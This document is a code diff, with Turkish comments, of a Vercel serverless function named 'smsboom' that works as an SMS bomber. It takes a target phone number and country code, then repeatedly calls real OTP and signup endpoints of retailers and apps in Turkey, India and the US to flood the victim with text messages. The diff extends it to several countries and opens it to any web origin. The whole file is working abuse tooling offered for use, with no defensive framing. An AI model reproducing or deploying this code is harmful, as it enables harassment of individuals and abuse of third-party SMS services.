@@ -1,20 +1,30 @@
-// api/smsboom.js
+// api/smsboom.js - Vercel Serverless Function
+import fetch from 'node-fetch';
+
 export default async function handler(req, res) {
+  // CORS headers
+  res.setHeader('Access-Control-Allow-Credentials', true);
+  res.setHeader('Access-Control-Allow-Origin', '*');
+  res.setHeader('Access-Control-Allow-Methods', 'GET,POST,OPTIONS');
+  res.setHeader('Access-Control-Allow-Headers', 'X-CSRF-Token, X-Requested-With, Accept, Accept-Version, Content-Length, Content-MD5, Content-Type, Date, X-Api-Version');
+
+  // Handle OPTIONS request for CORS
+  if (req.method === 'OPTIONS') {
+    res.status(200).end();
+    return;
+  }
+
   try {
-    let phone, amount;
+    let phone, amount, country = '91';
 
     if (req.method === 'GET') {
       phone = req.query.phone;
       amount = req.query.amount || 5;
+      country = req.query.country || '91';
     } else if (req.method === 'POST') {
-      let body;
-      try {
-        body = JSON.parse(req.body);
-      } catch {
-        body = req.body || {};
-      }
-      phone = body.phone;
-      amount = body.amount || 5;
+      phone = req.body.phone;
+      amount = req.body.amount || 5;
+      country = req.body.country || '91';
     } else {
       return res.status(405).json({
         status: 'error',
@@ -32,34 +42,35 @@ export default async function handler(req, res) {
     // Telefon numarasını temizle
     phone = phone.replace(/\s/g, '');
     
-    // Telefon validasyonu (Replit sistemine uygun)
-    if (!phone.match(/^5[0-9]{9}$/)) {
+    // Telefon validasyonu
+    if (!isValidPhone(phone, country)) {
       return res.status(400).json({
         status: 'error',
-        message: 'Geçersiz telefon formatı. 10 haneli ve 5 ile başlamalı. Örnek: 5401234567'
+        message: `Geçersiz telefon formatı. Ülke: +${country}, Numara: ${phone}`
       });
     }
 
     // Miktar sınırı
-    amount = Math.min(Math.max(parseInt(amount), 1), 10);
+    amount = Math.min(Math.max(parseInt(amount), 1), 5); // Vercel timeout için max 5
 
-    console.log(`🚀 SMS Bomber Başlatılıyor: ${phone} - Miktar: ${amount}`);
+    console.log(`🚀 SMS Bomber Başlatılıyor: +${country}${phone} - Miktar: ${amount}`);
 
-    // Replit SMS Bomber'ı başlat
-    const result = await startReplitSMSBomber(phone, amount);
+    // SMS Bomber'ı başlat (async - Vercel timeout'u önlemek için)
+    const result = await startSMSBombing(phone, amount, country);
     
-    res.json({
+    res.status(200).json({
       status: 'success',
       endpoint: '/api/smsboom',
       method: req.method,
       phone: phone,
+      country: country,
       amount: amount,
       total_attempts: result.total,
       successful: result.successful,
       failed: result.failed,
-      services: result.services,
-      timestamp: new Date().toISOString(),
-      note: "Replit SMS Bomber sistemi çalıştırıldı"
+      services_used: result.services.map(s => s.name),
+      results: result.details,
+      timestamp: new Date().toISOString()
     });
 
   } catch (error) {
@@ -71,89 +82,48 @@ export default async function handler(req, res) {
   }
 }
 
-// Replit SMS Bomber fonksiyonu
-async function startReplitSMSBomber(phone, amount) {
+// Telefon validasyonu
+function isValidPhone(phone, country) {
+  const patterns = {
+    '91': /^[6-9][0-9]{9}$/, // Hindistan
+    '977': /^[9][0-9]{9}$/, // Nepal
+    '218': /^[9][0-9]{8}$/, // Libya
+    '90': /^5[0-9]{9}$/, // Türkiye
+    '1': /^[2-9][0-9]{9}$/, // ABD/Kanada
+    '44': /^7[0-9]{9}$/ // UK
+  };
+  
+  return patterns[country] ? patterns[country].test(phone) : /^[0-9]{10,15}$/.test(phone);
+}
+
+// SMS Bomber fonksiyonu
+async function startSMSBombing(phone, amount, country) {
   const results = {
     total: 0,
     successful: 0,
     failed: 0,
-    services: []
+    services: getServicesByCountry(country),
+    details: []
   };
 
-  // Replit'teki servisler
-  const services = [
-    {
-      name: "Bim Cell",
-      url: "https://bim.veesk.net/service/v1.0/account/login",
-      method: "POST",
-      data: { phone: phone }
-    },
-    {
-      name: "Migros Sanal Market", 
-      url: "https://rest.migros.com.tr/sanalmarket/users/login/otp",
-      method: "POST",
-      data: { phoneNumber: phone }
-    },
-    {
-      name: "A101",
-      url: "https://www.a101.com.tr/users/otp-login/",
-      method: "POST", 
-      data: { phone: phone, next: "/a101-kapida" }
-    },
-    {
-      name: "Şok Market",
-      url: "https://api.ceptesok.com/api/users/sendsms",
-      method: "POST",
-      data: { mobile_number: phone, token_type: "register_token" }
-    },
-    {
-      name: "Kahve Dünyası",
-      url: "https://core.kahvedunyasi.com/api/users/sms/send",
-      method: "POST",
-      data: { mobile_number: phone, token_type: "register_token" }
-    },
-    {
-      name: "English Home",
-      url: "https://www.englishhome.com/enh_app/users/registration/",
-      method: "POST",
-      data: {
-        first_name: "Test",
-        last_name: "User", 
-        email: `test${Date.now()}@gmail.com`,
-        phone: phone,
-        password: "Test123456",
-        confirm: "true"
-      }
-    },
-    {
-      name: "Tıkla Gelsin",
-      url: "https://www.tiklagelsin.com/user/graphql",
-      method: "POST",
-      headers: {
-        "x-device-type": "3",
-        "x-merchant-type": "0", 
-        "x-no-auth": "true"
-      },
-      data: {
-        operationName: "GENERATE_OTP",
-        variables: {
-          phone: `+90${phone}`,
-          challenge: "85033055-4b81-4f6f-aed2-4a8ee1dce968",
-          deviceUniqueId: "web_6f59c0e5-3a0a-4bd3-907d-3cd973152333"
-        },
-        query: "mutation GENERATE_OTP($phone: String, $challenge: String, $deviceUniqueId: String) { generateOtp( phone: $phone challenge: $challenge deviceUniqueId: $deviceUniqueId ) }"
-      }
-    }
-  ];
-
-  // SMS gönderimini başlat
-  for (let i = 0; i < amount; i++) {
-    console.log(`📦 Tur ${i + 1}/${amount} başlatılıyor...`);
+  // Hızlı mod - Vercel timeout'u önlemek için
+  const fastMode = amount > 3;
+  
+  // Her tur için
+  for (let round = 0; round < amount; round++) {
+    console.log(`📦 Tur ${round + 1}/${amount} başlatılıyor...`);
     
-    for (const service of services) {
+    // Her servis için
+    for (const service of results.services) {
+      if (results.total >= 15) break; // Vercel timeout önleme
+      
       results.total++;
       
       try {
+        // URL ve data'yı formatla
+        const formattedUrl = formatTemplate(service.url, phone, country);
+        const formattedData = formatData(service.data, phone, country);
+        
         const requestOptions = {
           method: service.method,
           headers: {
@@ -161,11 +131,27 @@ async function startReplitSMSBomber(phone, amount) {
             'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
             ...service.headers
           },
-          body: JSON.stringify(service.data)
+          timeout: 10000 // 10 saniye timeout
         };
 
-        const response = await fetch(service.url, requestOptions);
-        const isSuccess = response.status === 200 || response.status === 202;
+        // GET veya POST için body ayarla
+        if (service.method === 'POST') {
+          requestOptions.body = JSON.stringify(formattedData);
+        }
+
+        const response = await fetch(formattedUrl, requestOptions);
+        const responseText = await response.text();
+        
+        let isSuccess = false;
+        
+        // Başarı kontrolü
+        if (service.identifier) {
+          isSuccess = responseText.includes(service.identifier) || 
+                     response.status === 200 || 
+                     response.status === 202;
+        } else {
+          isSuccess = response.status === 200 || response.status === 202;
+        }
 
         if (isSuccess) {
           results.successful++;
@@ -175,36 +161,156 @@ async function startReplitSMSBomber(phone, amount) {
           console.log(`❌ ${service.name} - Başarısız (${response.status})`);
         }
 
-        results.services.push({
+        results.details.push({
+          round: round + 1,
           service: service.name,
-          round: i + 1,
           status: isSuccess ? 'success' : 'failed',
           status_code: response.status,
           timestamp: new Date().toISOString()
         });
 
-        // 2 saniye bekle (rate limit)
-        await new Promise(resolve => setTimeout(resolve, 2000));
+        // Hızlı modda daha az bekle
+        if (!fastMode) {
+          await new Promise(resolve => setTimeout(resolve, 1500));
+        }
         
       } catch (error) {
         results.failed++;
-        results.services.push({
+        results.details.push({
+          round: round + 1,
           service: service.name,
-          round: i + 1,
           status: 'error',
           error: error.message,
           timestamp: new Date().toISOString()
         });
         console.log(`⚠️ ${service.name} - Hata: ${error.message}`);
+        
+        if (!fastMode) {
+          await new Promise(resolve => setTimeout(resolve, 1000));
+        }
       }
     }
     
     // Tur arası bekleme
-    if (i < amount - 1) {
-      await new Promise(resolve => setTimeout(resolve, 3000));
+    if (round < amount - 1 && !fastMode) {
+      await new Promise(resolve => setTimeout(resolve, 2000));
     }
   }
 
-  console.log(`🎉 Replit SMS Bomber tamamlandı! Başarılı: ${results.successful}, Başarısız: ${results.failed}`);
+  console.log(`🎉 SMS Bomber tamamlandı! Başarılı: ${results.successful}, Başarısız: ${results.failed}`);
   return results;
+}
+
+// Template formatlama
+function formatTemplate(template, phone, country) {
+  return template
+    .replace(/{target}/g, phone)
+    .replace(/{cc}/g, country);
+}
+
+// Data formatlama
+function formatData(data, phone, country) {
+  if (typeof data === 'string') {
+    return formatTemplate(data, phone, country);
+  }
+  
+  if (!data) return {};
+  
+  const formatted = {};
+  for (const [key, value] of Object.entries(data)) {
+    if (typeof value === 'string') {
+      formatted[key] = formatTemplate(value, phone, country);
+    } else {
+      formatted[key] = value;
+    }
+  }
+  return formatted;
+}
+
+// Ülkeye göre servisleri getir
+function getServicesByCountry(country) {
+  const services = {
+    '91': [ // Hindistan
+      {
+        name: "Paytm",
+        method: "POST",
+        url: "https://commonfront.paytm.com/v4/api/sendsms",
+        data: {
+          phone: "{target}",
+          guid: "2952fa812660c58dc160ca6c9894221d"
+        },
+        identifier: "202"
+      },
+      {
+        name: "Pharmeasy",
+        method: "POST",
+        url: "https://pharmeasy.in/api/auth/requestOTP",
+        data: {
+          contactNumber: "{target}"
+        },
+        identifier: "resendSmsCounter"
+      },
+      {
+        name: "Dream11",
+        method: "POST",
+        url: "https://api.dream11.com/sendsmslink",
+        data: {
+          siteId: "1",
+          mobileNum: "{target}",
+          appType: "androidfull"
+        },
+        identifier: "true"
+      }
+    ],
+    '90': [ // Türkiye
+      {
+        name: "Bim",
+        method: "POST",
+        url: "https://bim.veesk.net/service/v1.0/account/login",
+        data: { phone: "{target}" }
+      },
+      {
+        name: "Migros",
+        method: "POST",
+        url: "https://rest.migros.com.tr/sanalmarket/users/login/otp", 
+        data: { phoneNumber: "{target}" }
+      },
+      {
+        name: "A101",
+        method: "POST",
+        url: "https://www.a101.com.tr/users/otp-login/",
+        data: { phone: "{target}", next: "/a101-kapida" }
+      }
+    ],
+    '1': [ // ABD/Kanada
+      {
+        name: "Tinder US",
+        method: "POST",
+        url: "https://api.gotinder.com/v2/auth/sms/send",
+        data: {
+          phone_number: "{cc}{target}"
+        },
+        identifier: "200"
+      }
+    ],
+    'multi': [ // Çoklu ülke
+      {
+        name: "Global Service 1",
+        method: "POST",
+        url: "https://api.gotinder.com/v2/auth/sms/send",
+        data: {
+          phone_number: "{cc}{target}"
+        },
+        identifier: "200"
+      }
+    ]
+  };
+
+  // Seçilen ülke + multi servisleri (max 4 servis - Vercel optimizasyonu)
+  const selectedServices = [
+    ...(services[country] || services['91']), // Fallback Hindistan
+    ...services.multi
+  ];
+  
+  return selectedServices.slice(0, 4);
 }
